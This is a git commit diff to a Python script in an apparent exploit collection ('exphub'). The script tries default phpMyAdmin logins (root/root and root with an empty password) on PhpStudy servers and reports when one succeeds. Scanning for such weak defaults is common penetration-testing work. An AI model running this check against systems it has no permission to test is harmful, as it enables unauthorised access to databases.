f5fe2c7c39b1870dc4c7b1544d8f71c8e778944c
JE2Se <834590049@qq.com>
2020-06-12 12:32:00 +0800

    写错了🙈🙈🙈

--- exphub/phpstudy/PhpStudyDB.py
+++ exphub/phpstudy/PhpStudyDB.py
@@ -17,28 +17,46 @@ import requests
 
 def PhpStudyDB(Url): #必须与脚本名称相同
     scheme, url, port = umethod(Url)
-    urldata = scheme + "://" + url + ':' + str(port) + '/phpmyadmin/index.php'
-    post_data = {
-        "pma_username": "root",
-        "pma_password": "root",
-        "server": "1",
-        "target": "index.php"
-    }
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
-        "Accept-Language": "zh-CN",
-        "X-Forwarded-For": "8.8.8.8",
-        "Connection": "close",
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept': '*/*',
-        "Content-Type": "application/x-www-form-urlencoded",
-    }
     try:
-        a =requests.post(urldata, data=post_data, headers=headers, timeout=4, verify=False)
-        a1 = requests.get(urldata, headers=headers, timeout=4, verify=False)
-        con = a.text
-        con2 = a1.text
-        if con2.lower().find('navigation.php')!=-1 and con.lower().find('frame_navigation')!=-1:
+        payload_url = scheme + "://" + url + ':' + str(port) + "/phpmyadmin/index.php"
+        headers = {
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            "Content-Type": "application/x-www-form-urlencoded",
+            'User-Agent':"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
+        }
+        post_data = {
+            "pma_username": "root",
+            "pma_password": "root",
+            "server": "1",
+            "target": "index.php"
+        }
+        s = requests.session()
+        resp = s.post(payload_url, data=post_data, headers=headers, timeout=5, verify=False)
+        resp2 = s.get(payload_url, headers=headers, timeout=5, verify=False)
+        con = resp.text
+        con2 = resp2.text
+        if con2.lower().find('navigation.php') != -1 and con.lower().find('frame_navigation') != -1:
             print(Vcolors.RED +"[!] 存在PhpStudy默认数据库界面口令漏洞\r默认口令root/root\r" + Vcolors.ENDC)
+        payload_url = scheme + "://" + url + ':' + str(port) + "/phpmyadmin/index.php"
+        headers = {
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            "Content-Type": "application/x-www-form-urlencoded",
+            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
+        }
+        post_data = {
+            "pma_username": "root",
+            "pma_password": "",
+            "server": "1",
+            "target": "index.php"
+        }
+        s = requests.session()
+        resp = s.post(payload_url, data=post_data, headers=headers, timeout=5, verify=False)
+        resp2 = s.get(payload_url, headers=headers, timeout=5, verify=False)
+        con = resp.text
+        con2 = resp2.text
+        if con2.lower().find('navigation.php') != -1 and con.lower().find('frame_navigation') != -1:
+            print(Vcolors.RED + "[!] 存在PhpStudy默认数据库界面口令漏洞\r默认口令root/空密码\r" + Vcolors.ENDC)
     except:
         logging.error("PhpStudyDB脚本出现异常")
